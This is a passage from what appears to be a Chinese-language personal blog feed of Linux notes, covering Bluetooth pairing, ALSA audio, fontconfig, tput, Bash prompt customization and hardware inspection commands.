    <url>/2022/09/06/Linux-%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9B%AE%E5%BD%95%E5%90%8D%E7%A7%B0%E5%8F%8A%E7%9B%B8%E5%BA%94%E5%86%85%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/Linux%E7%9B%AE%E5%BD%95.png" alt="Linux目录"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中关于 Bluetooth</title>
    <link href="/2022/09/06/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bluetooth/"/>
    <url>/2022/09/06/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bluetooth/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Bluetooth">ArchWiki 中相关部分</a><br>Bluetooth 是一个短距离无线通信的标准，用于在手机，计算机和其他电子设备之间通信。</p><p>在 Linux 中，权威的蓝牙协议栈实现是 BlueZ</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul><li>bluez, 提供蓝牙协议栈</li><li>bluez-utils, 提供  <code>bluetoothctl</code> 实用程序</li><li>btusb 内核模块，是通用的蓝牙驱动，需要检查其是否加载</li><li>启用 <code>bulutooth.service</code></li></ul><p>蓝牙守护进程默认只会向属于 <code>lp</code> 组的用户暴露 <code>bnep0</code> 设备，如果要连接到蓝牙设备，先将用户添加到这个组，可以在 <code>/usr/share/dbus-1/system.d/bluetooth.conf</code> 中修改。</p><p>一些蓝牙适配器和无线网卡绑定，这些蓝牙适配器需要先启用无线网卡才能被内核识别。</p><h1 id="配对"><a href="#配对" class="headerlink" title="配对"></a>配对</h1><p>在使用蓝牙设备之前先检查其有没有被 rfkill 禁用。</p><p>一般步骤：<br>先运行 <code>bluetoothctl</code> 进入交互界面:</p><ol><li>(可选操作) <code>select MAC_address</code>, 选择一个默认的蓝牙接收器</li><li><code>power on</code>, 打开蓝牙，默认为关闭</li><li><code>devices</code>, 获得要配对的设备的 MAC 地址</li><li><code>scan on</code>, 搜索发现所有可配对的设备</li><li><code>agent on</code>, 打开代理或者选择一个特定的代理</li><li><code>pair MAC_address</code>, 配对设备</li><li><code>trust MAC_address</code>, 添加到信任列表</li><li><code>connect MAC_address</code>, 建立链接</li></ol><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>开机后自启动等，见 ArchWiki</p><h2 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h2><p>在 <code>/etc/bluetooth/main.conf</code> 中添加:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Policy]</span><br><span class="hljs-attr">AutoEnable</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="启动后自动可被发现"><a href="#启动后自动可被发现" class="headerlink" title="启动后自动可被发现"></a>启动后自动可被发现</h2><p>在 <code>/etc/bluetooth/main.conf</code> 中添加:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[General]</span><br><span class="hljs-attr">DiscoverableTimeout</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="连接蓝牙耳机"><a href="#连接蓝牙耳机" class="headerlink" title="连接蓝牙耳机"></a>连接蓝牙耳机</h1><p>需要先安装 <code>pulseaudio-bluetooth</code></p><p>有时候要用 <code>pavucontrol</code> 选择音频的输出设备.</p><p>确认重新启动 pulseaudio 来使得安装生效:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>pulseaudio -k<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中关于 ALSA</title>
    <link href="/2022/09/06/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-ALSA/"/>
    <url>/2022/09/06/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-ALSA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Advanced_Linux_Sound_Architecture">ArchWiki 相关页面</a><br>ALSA 是 Advanced Linux Sound Architecture 的简称，其提供声卡的内核驱动。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>ALSA 是一组内置的 Linux 内核模块，无需手动安装。</p><p>udev 会在系统启动时自动检测硬件并选择所需的驱动，并加载相应的声音设备驱动模块。</p><h2 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h2><p>一般情况下，本地用户有权播放音频和改变混音器音量。</p><p>要让远程用户拥有这些权限，需要把这些用户加入 <code>audio</code> 用户组。</p><p><code>audio</code> 用户组允许用户直接访问设备。默认情况下不建议把用户加入 <code>audio</code> 用户组.</p><h2 id="ALSA-实用程序"><a href="#ALSA-实用程序" class="headerlink" title="ALSA 实用程序"></a>ALSA 实用程序</h2><p>安装软件包 <code>alsa-utils</code> 其包含 <code>alsamixer</code>, <code>amixer</code> 等:</p><ul><li><code>amixer</code>, shell 命令</li><li><code>alsamixer</code>, 基于 ncurses 的界面</li></ul><h1 id="解除各声道的静音"><a href="#解除各声道的静音" class="headerlink" title="解除各声道的静音"></a>解除各声道的静音</h1><p>ALSA 默认静音所有声道，需要手动解除.</p><h2 id="使用-amixer"><a href="#使用-amixer" class="headerlink" title="使用 amixer"></a>使用 amixer</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ amixer sset <span class="hljs-keyword">Master</span> <span class="hljs-title">unmute</span><br>$ amixer sset Speaker unmute<br>$ amixer sset Headphone unmute<br></code></pre></td></tr></table></figure><h2 id="使用-alsamixer"><a href="#使用-alsamixer" class="headerlink" title="使用 alsamixer"></a>使用 alsamixer</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>alsamixer<br></code></pre></td></tr></table></figure><p>然后上下左右键位.</p><h2 id="启用麦克风"><a href="#启用麦克风" class="headerlink" title="启用麦克风"></a>启用麦克风</h2><p>按 <code>F4</code> 切换至 <code>Capture</code> 选项卡，然后按空格启用一个声道.</p><h2 id="测试更改"><a href="#测试更改" class="headerlink" title="测试更改"></a>测试更改</h2><p>测试声卡是否工作:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ speaker-<span class="hljs-keyword">test</span> -c <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>需根据扬声器的配置，调整 <code>-c</code>.</p><p>若系统有多个声卡，可以用 <code>F6</code> 切换.</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>系统配置文件是 <code>/etc/asound.conf</code>, 分用户配置文件是 <code>~/.asoundrc</code>.</p><p>基本语法见 ArchWiki.</p><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h2 id="禁止启动时自动静音"><a href="#禁止启动时自动静音" class="headerlink" title="禁止启动时自动静音"></a>禁止启动时自动静音</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta"># amixer -c 0 sset <span class="hljs-string">&quot;Auto-Mute Mode&quot;</span> Disabled</span><br></code></pre></td></tr></table></figure><p>使用 <code>alsamixerl</code> 图形界面时:</p><ul><li><code>alsactl store</code> 保存更改</li><li><code>alsactl daemon</code> 保存更改</li></ul><h2 id="键盘控制音量"><a href="#键盘控制音量" class="headerlink" title="键盘控制音量"></a>键盘控制音量</h2><p>将下面命令映射到你的音量键: <code>XF86AudioRaiseVolume</code>, <code>XF86AudioLowerVolume</code>, <code>XF86AudioMute</code>:<br>增加音量:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">amixer set <span class="hljs-keyword">Master</span> <span class="hljs-title">5</span>%+<br></code></pre></td></tr></table></figure><p>减小音量:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">amixer set <span class="hljs-keyword">Master</span> <span class="hljs-title">5</span>%-<br></code></pre></td></tr></table></figure><p>静音&#x2F;解除静音:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">amixer set <span class="hljs-keyword">Master</span> <span class="hljs-title">toggle</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于 Shell 字体美化</title>
    <link href="/2022/09/06/%E5%85%B3%E4%BA%8E-Shell-%E5%AD%97%E4%BD%93%E7%BE%8E%E5%8C%96/"/>
    <url>/2022/09/06/%E5%85%B3%E4%BA%8E-Shell-%E5%AD%97%E4%BD%93%E7%BE%8E%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h1><ul><li>为单个用户安装，将字体放入 <code>~/.local/share/fonts</code> 目录下</li><li>为系统所有用户安装，安装到 <code>/usr/local/share/fonts</code> 目录下, <code>/usr/share/fonts</code> 由包管理器管理，不要手动修改</li></ul><p>需要确保所有用户都有读取字体文件的权限.</p><h1 id="后备字体顺序"><a href="#后备字体顺序" class="headerlink" title="后备字体顺序"></a>后备字体顺序</h1><p>Fontconfig 会自动选择一个满足当前显示需求的字体。</p><p>Fontconfig 允许每个用户使用 <code>$XDG_CONFIG_HOME/fontconfig/fonts.conf</code> 赖调整字体的选择顺序.</p><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h2 id="列出所有已安装字体"><a href="#列出所有已安装字体" class="headerlink" title="列出所有已安装字体"></a>列出所有已安装字体</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">fc</span><span class="hljs-literal">-list</span><br></code></pre></td></tr></table></figure><h2 id="列出特定语言的已安装字体"><a href="#列出特定语言的已安装字体" class="headerlink" title="列出特定语言的已安装字体"></a>列出特定语言的已安装字体</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>fc-list <span class="hljs-symbol">:lang=<span class="hljs-string">&quot;&quot;</span></span><br></code></pre></td></tr></table></figure><p>如中文:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>fc-list <span class="hljs-symbol">:lang=<span class="hljs-string">&quot;zh&quot;</span></span><br></code></pre></td></tr></table></figure><p>可安装:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S extra/noto-fonts-cjk<br></code></pre></td></tr></table></figure><h1 id="Font-configuration"><a href="#Font-configuration" class="headerlink" title="Font configuration"></a>Font configuration</h1><p>Fontconfig 是一个库，用于为应用程序提供可用的字体列表，及配置字体如何渲染。</p><p>Fontconfig 的默认路径包含 <code>/usr/share/fonts</code>, <code>/usr/local/share/fonts</code>, <code>~/.local/share/fonts</code></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>单用户配置文件在 <code>$XDG_CONFIG_HOME/fontconfig/fonts.conf</code> (通常为 <code>$HOME/.config/fontconfig/fonts.conf</code>), 全局配置在 <code>/etc/fonts/local.conf</code>. 单用户配置优先级高于全局配置.</p><p>路径里面文件前面的数字需要在 00~99 之间.</p><p>Fontconfig 把所有配置集中到一个单独的中心文件 <code>/etc/fonts/fonts.conf</code> 中, 不建议直接修改.</p><p>Fontconfig 配置文件使用 XML 格式.</p><h3 id="预置"><a href="#预置" class="headerlink" title="预置"></a>预置</h3><p>预置存放在 <code>/usr/share/fontconfig/conf.avail</code>.</p><p>可以用创建符号链接到此处的形式启用.</p><h3 id="后备字体顺序-1"><a href="#后备字体顺序-1" class="headerlink" title="后备字体顺序"></a>后备字体顺序</h3><p>Fontconfig 会自动选择一个满足当前显示需求的字体.</p><p>Fontconfig 允许每个用户通过 <code>$XDG_CONFIG_HOME/fontconfig/fonts.conf</code> 调整字体的选择顺序.</p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bash 中 tput 使用</title>
    <link href="/2022/09/05/Bash-%E4%B8%AD-tput-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/05/Bash-%E4%B8%AD-tput-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/brahmsjiang/article/details/78170238">参考</a><br><a href="inmp.ailinux.net/tput">参考</a><br>tput 命令通过将 terminfo 数据库对你的终端会话进行初始化和操作。</p><p>可以移动或更改光标，更改文本属性，以及清除终端屏幕的特性。</p><h1 id="terminfo"><a href="#terminfo" class="headerlink" title="terminfo"></a>terminfo</h1><p>UNIX 系统上的 terminfo 数据库用于定义终端和打印机的属性及功能，包括各设备的行数和列数以及要发送至该设备的文本的属性.</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="改变光标属性"><a href="#改变光标属性" class="headerlink" title="改变光标属性"></a>改变光标属性</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">tput <span class="hljs-attribute">clear</span> # 清屏<br>tput sc # save <span class="hljs-attribute">cursor</span> <span class="hljs-attribute">position</span> 保存当前光标位置 <br>tput cup <span class="hljs-number">10</span> <span class="hljs-number">13</span> # <span class="hljs-attribute">cursor</span> <span class="hljs-attribute">position</span> 将光标移动到 row10 col13<br>tput civis # <span class="hljs-attribute">cursor</span> invisible 光标不可见<br>tput cnorm # <span class="hljs-attribute">cursor</span> <span class="hljs-attribute">normal</span> 光标可见<br>tput rc # restore <span class="hljs-attribute">cursor</span> <span class="hljs-attribute">position</span> 光标返回上次保存的位置<br></code></pre></td></tr></table></figure><h3 id="移动光标并显示信息"><a href="#移动光标并显示信息" class="headerlink" title="移动光标并显示信息"></a>移动光标并显示信息</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tput</span> sc ; <span class="hljs-attribute">tput</span> cup <span class="hljs-number">23</span> <span class="hljs-number">45</span> ; <span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;Input from tput/echo at 23/45&quot;</span> ; <span class="hljs-attribute">tput</span> rc<br></code></pre></td></tr></table></figure><p>这条语句让光标先移动到 (23, 45) 这个坐标，然后打印 <code>Input from tput/echo at 23/45</code> 这句话，最后返回原来的位置.</p><p>在显示了信息之后，光标必须使用 <code>tput rc</code> 返回到之前保存的原始位置.</p><h3 id="更改光标的属性"><a href="#更改光标的属性" class="headerlink" title="更改光标的属性"></a>更改光标的属性</h3><p>在向某一设备显示数据时，将光标转换为不可见可以使数据滚动时的屏幕看起来更整洁，可先使用 <code>civis</code> 选项，再使用 <code>cnorm</code> 选项.</p><h2 id="改变文本属性"><a href="#改变文本属性" class="headerlink" title="改变文本属性"></a>改变文本属性</h2><p>如，使文本加粗，在文本下方添加下划线，更改背景颜色和前景颜色，逆转颜色等。</p><ul><li><code>tput setb</code>, set background</li><li><code>tput setf</code>, set foregrounf<br>颜色和分配的数值有关:</li><li>0 : 黑色</li><li>1 : 蓝色</li><li>2 : 绿色</li><li>3 : 青色</li><li>4 : 红色</li><li>5 : 洋红色</li><li>6 : 黄色</li><li>7 : 白色<br>反显当前颜色 <code>tput rev</code>.</li></ul><p>粗体使用 <code>tput bold</code>.</p><p>添加下划线使用 <code>tput smul</code>, 去除下划线使用 <code>tput rmul</code></p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中关于 Bash 的美化</title>
    <link href="/2022/09/05/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bash-%E7%9A%84%E7%BE%8E%E5%8C%96/"/>
    <url>/2022/09/05/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bash-%E7%9A%84%E7%BE%8E%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Bash/Prompt_customization">ArchWiki Bash&#x2F;Prompt</a></p><h1 id="Bash-x2F-Prompt-customization"><a href="#Bash-x2F-Prompt-customization" class="headerlink" title="Bash&#x2F;Prompt customization"></a>Bash&#x2F;Prompt customization</h1><h2 id="Prompts"><a href="#Prompts" class="headerlink" title="Prompts"></a>Prompts</h2><p>Bash 有 4 个 prompt strings 可以自定义.</p><p>这里的 <code>PS</code> 是 <code>Prompt Stringl</code> 的含义:</p><ul><li><code>PS0</code>, 在每次命令输出后显示在 output 之前, 几乎每个命令都会有输出，它就位于输出之前, 默认是没有的</li><li><code>PS1</code>, 其为基础的 prompt, 会显示在命令之前, 就比如现在的 <code>[jie@EVA ~]$</code>, 全部</li><li><code>PS2</code>, 当 command 需要更多 input 时显示, 如 <code>echo &lt;&lt; EOF</code> 后出现的 <code>&gt;</code></li><li><code>PS3</code></li><li><code>PS4</code></li></ul><p>所有的这些 prompt 都可以在 <code>~/.bashrc</code> 中设置, 如:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">PS2</span>=<span class="hljs-string">&#x27;&gt;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><h3 id="Bash-escape-sequeces"><a href="#Bash-escape-sequeces" class="headerlink" title="Bash escape sequeces"></a>Bash escape sequeces</h3><p>当打印 prompt string 时，Bash 会寻找某些反斜线转义的字符 (backslash-escaped characters), 然后把它们扩展成 special strings, 如:</p><ul><li><code>\u</code>, 会被扩展成当前用户的名称</li><li><code>\A</code>, 会被扩展成当前的时间<br>因此，如果:<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r">PS1<span class="hljs-operator">=</span>`\A \u $`<br></code></pre></td></tr></table></figure>就会被扩展成 <code>17:35 username $</code>.</li></ul><p>在 <code>man bash</code> 中查找 <code>PROMTING</code> 可以看到全部列表.</p><p>以下为我自己可能会用到的:</p><ul><li><code>\d</code>, 以 “Weekday Month Date” 的形式显示时间</li><li><code>\h</code>, 第一个 <code>.</code> 之前的 hostname, 一般的 hostname 不一定是一个单词</li><li><code>\H</code>, the hostname</li><li><code>\j</code>, the number of jobs currently managed by shell</li><li><code>\i</code>, the basename of the shell’s terminal device name</li><li><code>\s</code>, shell 的名字</li><li><code>\t</code>, 用 24 小时制 “HH:MM:SS” 显示当前时间</li><li><code>\u</code>, 当前用户的名称</li><li><code>\w</code>, 当前目录，<code>$HOME</code> 被简化为 <code>~</code> 波浪线 (tilde)</li><li><code>\[</code>, 开始 a sequence of non-printing character, 即不会显示出非打印字符</li><li><code>\]</code>, 结束 a sequence of non-printing character<br><code>\a</code> 蜂鸣，<code>\n</code> 换行等都是 non-printing character.</li></ul><h3 id="Terminfo-escape-sequences"><a href="#Terminfo-escape-sequences" class="headerlink" title="Terminfo escape sequences"></a>Terminfo escape sequences</h3><p>查看当前 terminal 提供的 capabilities:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>infocmp<br></code></pre></td></tr></table></figure><p>出现在 <code>=</code> 之前的是 <code>capability</code> 的名字. 可在 <code>/usr/share/terminfo</code> 里面查看具体内容.</p><p>比如 <code>setaf</code> 用来设置 <code>foreground color of whatever text is printed after it</code></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>tput setaf <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>设置例子:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">GREEN</span>=<span class="hljs-string">&quot;\[<span class="hljs-variable">$(tput setaf 2)</span>\]&quot;</span><br><span class="hljs-attribute">RESET</span>=<span class="hljs-string">&quot;\[<span class="hljs-variable">$(tput sgr0)</span>\]&quot;</span><br><br><span class="hljs-attribute">PS1</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GREEN&#125;</span>my prompt<span class="hljs-variable">$&#123;RESET&#125;</span>&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>Bash man page 建议把 <code>tput</code> 的输出用 <code>\[ \]</code> 包裹。这会帮助 bash 忽略非打印字符 (non-printable characters).</p><h3 id="PROMPT-COMMAND"><a href="#PROMPT-COMMAND" class="headerlink" title="PROMPT_COMMAND"></a>PROMPT_COMMAND</h3><p>这是一个变量，它的值会在 <code>PS1</code> 显示之前被 evaluated. 可用于 resign <code>PS1</code>.</p><h3 id="Escapes-between-command-input-and-output"><a href="#Escapes-between-command-input-and-output" class="headerlink" title="Escapes between command input and output"></a>Escapes between command input and output</h3><p>很多属性在改变后记得 reset.</p><h3 id="Customizing-root-prompts"><a href="#Customizing-root-prompts" class="headerlink" title="Customizing root prompts"></a>Customizing root prompts</h3><p>在 <code>/root</code> 中修改。</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><h3 id="infocmp-命令"><a href="#infocmp-命令" class="headerlink" title="infocmp 命令"></a>infocmp 命令</h3><p>会显示 the number of colors <code>tput</code> works with.</p><h1 id="参考另一篇文章"><a href="#参考另一篇文章" class="headerlink" title="参考另一篇文章"></a>参考另一篇文章</h1><p><a href="https://b23.tv/8VgYZzp">参考</a></p><h2 id="bash-手册"><a href="#bash-手册" class="headerlink" title="bash 手册"></a>bash 手册</h2><p><code>bash 1 printf</code> 是查看 bash shell 中 <code>printf</code> 的使用.</p><p><code>bash 3 printf</code> 可以查看 C 语言中 <code>printf</code> 的使用.</p><p>一个例子:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">printf</span> &#x27;\<span class="hljs-number">033</span>[<span class="hljs-number">1</span>;<span class="hljs-number">32</span>m yes \<span class="hljs-number">033</span>[<span class="hljs-number">0</span>m&#x27;<br></code></pre></td></tr></table></figure><ul><li><code>\033[</code> 表示开始的色彩控制.</li><li><code>1</code> 表示加粗</li><li><code>;</code> 表示分隔</li><li><code>32m</code> 表示绿色</li><li><code>\033[0m</code>  两个 <code>\033[</code> 之间的内容是范围，<code>0m</code> 是结束<br>具体的颜色可参见 <code>https://misc.flogisoft.com/bash/tip_colors_and_formatting</code>.</li></ul>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 查看设备和驱动安装相关信息</title>
    <link href="/2022/09/05/Linux-%E6%9F%A5%E7%9C%8B%E8%AE%BE%E5%A4%87%E5%92%8C%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF/"/>
    <url>/2022/09/05/Linux-%E6%9F%A5%E7%9C%8B%E8%AE%BE%E5%A4%87%E5%92%8C%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/m1223853767/article/details/79615011">参考</a></p><h1 id="列出所有硬件信息"><a href="#列出所有硬件信息" class="headerlink" title="列出所有硬件信息"></a>列出所有硬件信息</h1><p><code>lspci</code> 命令可以列出所有硬件信息，包括已经安装了驱动和为安装驱动的硬件设备，通过 <code>pci</code> 总线的连接情况读取信息.</p><h1 id="列出当前系统中所有已经加载了的模块-x2F-驱动"><a href="#列出当前系统中所有已经加载了的模块-x2F-驱动" class="headerlink" title="列出当前系统中所有已经加载了的模块&#x2F;驱动"></a>列出当前系统中所有已经加载了的模块&#x2F;驱动</h1><p>使用 <code>lsmod</code> 命令.</p><p><code>lsmod</code> 命令只能显示编译 linux 内核时选中为 “M” 的驱动程序。</p><h1 id="查看该设备的驱动有没有安装"><a href="#查看该设备的驱动有没有安装" class="headerlink" title="查看该设备的驱动有没有安装"></a>查看该设备的驱动有没有安装</h1><p>用 dmesg 命令，其信息较多，需要用 <code>grep</code> 过滤。</p><p>比如查看与 wifi 相关的:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$ dmesg <span class="hljs-string">| grep -i wifi</span><br></code></pre></td></tr></table></figure><h1 id="单看指定模块-x2F-驱动的信息"><a href="#单看指定模块-x2F-驱动的信息" class="headerlink" title="单看指定模块&#x2F;驱动的信息"></a>单看指定模块&#x2F;驱动的信息</h1><p>使用 modinfo 命令.</p><p>alias 指这个模块&#x2F;驱动所支持的硬件型号。</p><h1 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h1><p>用modprobe 或 insmod 命令.</p><h1 id="删除一个模块-x2F-驱动"><a href="#删除一个模块-x2F-驱动" class="headerlink" title="删除一个模块&#x2F;驱动"></a>删除一个模块&#x2F;驱动</h1><p>用 rmmod 命令.</p><h1 id="确定需要安装驱动的硬件型号"><a href="#确定需要安装驱动的硬件型号" class="headerlink" title="确定需要安装驱动的硬件型号"></a>确定需要安装驱动的硬件型号</h1><p>查看 <code>/etc/sysconfig/hwconf</code>.</p><p>vendorld 指的是硬件的生产商编号。</p><p>deviceld 指该设备的编号，一般生产商和设备编号都是四位。</p><h1 id="查找与设备相关的信息"><a href="#查找与设备相关的信息" class="headerlink" title="查找与设备相关的信息"></a>查找与设备相关的信息</h1><p>到 <code>http://pci-ids.ucw.cz/iii/</code> 这个网站查找。</p><h1 id="常用的检测命令"><a href="#常用的检测命令" class="headerlink" title="常用的检测命令"></a>常用的检测命令</h1><h2 id="用硬件检测程序-kuduz-探测新硬件"><a href="#用硬件检测程序-kuduz-探测新硬件" class="headerlink" title="用硬件检测程序 kuduz 探测新硬件"></a>用硬件检测程序 kuduz 探测新硬件</h2><h2 id="查看-CPU-信息"><a href="#查看-CPU-信息" class="headerlink" title="查看 CPU 信息"></a>查看 CPU 信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>cpuinfo<br></code></pre></td></tr></table></figure><h2 id="查看板卡信息"><a href="#查看板卡信息" class="headerlink" title="查看板卡信息"></a>查看板卡信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>pci<br></code></pre></td></tr></table></figure><h2 id="查看-PCI-信息"><a href="#查看-PCI-信息" class="headerlink" title="查看 PCI 信息"></a>查看 PCI 信息</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">lspci</span><br></code></pre></td></tr></table></figure><h2 id="查看内存信息"><a href="#查看内存信息" class="headerlink" title="查看内存信息"></a>查看内存信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/m</span>eminfo<br></code></pre></td></tr></table></figure><h2 id="查看-USB-设备信息"><a href="#查看-USB-设备信息" class="headerlink" title="查看 USB 设备信息"></a>查看 USB 设备信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>bus<span class="hljs-regexp">/usb/</span>devices<br></code></pre></td></tr></table></figure><h2 id="查看鼠标和键盘信息"><a href="#查看鼠标和键盘信息" class="headerlink" title="查看鼠标和键盘信息"></a>查看鼠标和键盘信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>bus<span class="hljs-regexp">/input/</span>devices<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>bus<span class="hljs-regexp">/usb/</span>devices<br></code></pre></td></tr></table></figure><h2 id="查看硬件信息和使用情况"><a href="#查看硬件信息和使用情况" class="headerlink" title="查看硬件信息和使用情况"></a>查看硬件信息和使用情况</h2><figure 